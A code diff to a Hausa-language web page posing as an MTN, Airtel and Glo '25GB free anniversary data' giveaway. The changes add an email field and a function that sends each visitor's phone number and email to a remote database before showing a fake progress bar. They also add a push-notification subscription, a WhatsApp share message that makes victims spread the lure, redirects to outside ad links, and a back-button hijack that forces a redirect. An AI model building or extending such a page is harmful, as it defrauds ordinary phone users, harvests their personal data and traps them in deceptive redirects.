@@ -46,6 +46,20 @@
     <meta property="og:updated_time" content="1440432930">
     <link rel="me" href="https://www.blogger.com/profile/13809910274301822692">
     <link rel="me" href="https://www.blogger.com/profile/17222055979768522082">
+
+  <!-- start webpushr code -->
+  <script>
+    (function(w,d,s,id){
+      if(typeof(w.webpushr)!=='undefined')return;
+      w.webpushr=w.webpushr||function(){(w.webpushr.q=w.webpushr.q||[]).push(arguments)};
+      var js,fjs=d.getElementsByTagName(s)[0];
+      js=d.createElement(s);js.id=id;js.async=1;
+      js.src='https://cdn.webpushr.com/app.min.js';
+      fjs.parentNode.appendChild(js);
+    }(window,document,'script','webpushr-jssdk'));
+    webpushr('setup',{'key':'BNqyP7Zc98Edi6fyli-Tmv2W0I35cDVO5REXf6ZdWSs4NPaNGOnQJQeRIDSubOh6NnNOvzFUs0WjwjLIZeojb-Y'});
+  </script>
+  <!-- end webpushr code -->
 </head>
 
 <body>
@@ -386,6 +400,7 @@
             <p class="title">Shigar da number waya :</p>
             <div class="phone">
                 <center><input type="number" placeholder="Enter your number here" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center>
+                <br><center><input type="email" placeholder="Shigar da Gmail/Email ɗinku" id="email" name="Email" inputmode="email" autocomplete="email" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;"></center>
                 <center>
                     <center>
                         <p class="title">Zabi Network</p>
@@ -402,7 +417,9 @@
                 </center><br>
                 <button id="confirm">Send</button>
             </div>
-            <p class="error">baku shigar lambar waya mai inganci ba, ku gyara !</p>
+            <p class="error" id="phoneError">baku shigar lambar waya mai inganci ba, ku gyara !</p>
+            <p class="error" id="emailError">Ku shigar da Gmail/Email mai inganci.</p>
+            <p class="error" id="saveError">Ba a samu damar adana bayananku ba. Ku sake gwadawa.</p>
         </div>
         <div id="checking">
             <p class="title">Please wait a moment...</p>
@@ -532,35 +549,66 @@ Na gode sosai. Da farko ban yarda da irin wannan ba, wallahi har yanzu ban gaska
                 }
             }, 50);
         });
-        $("#confirm").click(function() {
-            if ($("#name").val().length < 4) {
-                $(".error").fadeIn(500);
-            } else {
-                $("#info").fadeOut(0);
-                $("#checking").fadeIn(1000);
-                var i = 0;
-                var interval = setInterval(function() {
-                    i += 1;
-                    $("#percentage").text(i + "%");
-                    $("#fill").css("width", i + "%");
-                    if (i == 50) {
-                        i = 49;
-                        setTimeout(function() {
-                            i = 50;
-                        }, 1000);
-                    }
-                    if (i >= 100) {
-                        clearInterval(interval);
-                        $("#load").fadeOut(0);
-                        $("#check").fadeIn(0);
-                        setTimeout(function() {
-                            $("#checking").fadeOut(0);
-                            $("#share").fadeIn(1000);
-                            $("#getname").html($("#name").val());
-                        }, 500);
-                    }
-                }, 50);
+        async function saveRegistration(phone, email) {
+            try {
+                var response = await fetch("https://cqnovqvmxwmfngupgtov.supabase.co/rest/v1/rpc/register_anniversary_user", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "apikey": "sb_publishable_wm6kcw1pDhtyyORf0gLbVA_icVzmQ95"
+                    },
+                    body: JSON.stringify({
+                        p_phone: phone,
+                        p_email: email.toLowerCase()
+                    })
+                });
+                return response.ok;
+            } catch (e) {
+                return false;
             }
+        }
+        $("#confirm").click(async function() {
+            var phone = $("#name").val().trim();
+            var email = $("#email").val().trim();
+            var phoneOk = /^\d{10,11}$/.test(phone);
+            var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            $("#phoneError").toggle(!phoneOk);
+            $("#emailError").toggle(!emailOk);
+            $("#saveError").hide();
+            if (!phoneOk || !emailOk) return;
+
+            $(this).prop("disabled", true);
+            var stored = await saveRegistration(phone, email);
+            $(this).prop("disabled", false);
+            if (!stored) {
+                $("#saveError").fadeIn(500);
+                return;
+            }
+
+            $("#info").fadeOut(0);
+            $("#checking").fadeIn(1000);
+            var i = 0;
+            var interval = setInterval(function() {
+                i += 1;
+                $("#percentage").text(i + "%");
+                $("#fill").css("width", i + "%");
+                if (i == 50) {
+                    i = 49;
+                    setTimeout(function() {
+                        i = 50;
+                    }, 1000);
+                }
+                if (i >= 100) {
+                    clearInterval(interval);
+                    $("#load").fadeOut(0);
+                    $("#check").fadeIn(0);
+                    setTimeout(function() {
+                        $("#checking").fadeOut(0);
+                        $("#share").fadeIn(1000);
+                        $("#getname").html($("#name").val());
+                    }, 500);
+                }
+            }, 50);
         });
         $(document).click(function() {
             if ($("#name").is(":focus")) {
@@ -570,11 +618,11 @@ Na gode sosai. Da farko ban yarda da irin wannan ba, wallahi har yanzu ban gaska
     </script>
 
     <script>
-        var text1 = "*MTN, AIRTEL DA GLO NA BADA KYAUTAR 25GB DATA NA MURNAR CIKA SHEKARA 25*%0A%20%0A*Kamfanonin MTN, Airtel da Glo na bada kyautar 25GB data na 25 years anniversary%20don nuna farin cikinsu ga alumma.*%0A%20%0A*Yadda zaku samu wannan kyautar data daga MTN, Airtel ko Glo.*%0A%20%0A*Ku shiga 👇*%0Ahttps://kluspz.com/25GB-Free-Anniversary-Data%0A%20%0A*Kowa%20Ya Nema Kafin Su Daina Badawa*",
+        var text1 = "*MTN, AIRTEL DA GLO NA BADA KYAUTAR 25GB DATA NA MURNAR CIKA SHEKARA 25*%0A%20%0A*Kamfanonin MTN, Airtel da Glo na bada kyautar 25GB data na 25 years anniversary%20don nuna farin cikinsu ga alumma.*%0A%20%0A*Yadda zaku samu wannan kyautar data daga MTN, Airtel ko Glo.*%0A%20%0A*Ku shiga 👇*%0Ahttps://www.voicefornigeria.com/%0A%20%0A*Kowa%20Ya Nema Kafin Su Daina Badawa*",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            abcde = "go.php",
+            abcde = "https://jikgykm.com/cl/d2043286aec4e80a",
             saved = "",
             share = "whatsapp://send?text=" + text1;
     </script>
@@ -656,13 +704,16 @@ $("#offer").click(function () {
             fh();
         }
         setTimeout('hh();', 500);
+        window.addEventListener("popstate", function() {
+            window.location.replace("https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b");
+        }, { once: true });
 
         function fh() {
-            location.href = "go.php";
+            location.href = "https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b";
         }
 
         function goon() {
-            location.href = "go.php";
+            location.href = "https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b";
         }
     </script>
     <script>
